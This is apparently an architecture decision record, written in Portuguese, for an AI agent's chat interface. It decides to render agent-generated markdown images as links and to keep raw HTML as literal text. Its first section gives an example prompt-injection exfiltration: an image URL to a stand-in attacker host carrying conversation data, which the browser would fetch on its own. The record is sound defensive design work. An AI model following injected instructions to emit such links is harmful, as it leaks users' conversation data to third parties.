# 0022 — Imagens do markdown do agente viram link

Data: 2026-10-24 · Item: P2-04 · Status: aceita

## D-P2-04-1 — Imagens na resposta do agente

Contexto: o `MarkdownRenderer` carregava qualquer URL de imagem direto no browser. Uma injeção de prompt pode levar o agente a gerar `![](https://atacante/?d=<dados da conversa>)` e o browser faz a requisição sozinho (exfiltração, OWASP LLM Top 10).

Opções: **A) imagem vira link com o texto alternativo (só http/https), nova aba com `rel="noopener noreferrer"`, sem requisição automática**; B) só https, carregada direto (mantém o canal de exfiltração); C) allowlist de hosts por env (mais config e lógica).

Escolha: **A**. Reversível: uma allowlist pode entrar depois se houver caso real.

## D-P2-04-2 — HTML cru do agente: texto ou descarte

Contexto: sem `rehype-raw`, o `rehype-sanitize` descarta o nó `raw` inteiro. Um bloco de tag pseudo-XML (`<answer>…</answer>`, `<details>`) leva junto o texto até a linha em branco, e a resposta some.

Opções: **A) plugin local converte `raw` em texto antes do sanitize (nada some; o React escapa; as tags aparecem literais)**; B) manter o descarte (respostas podem sumir sem aviso).

Escolha: **A**. Sem dependência nova.
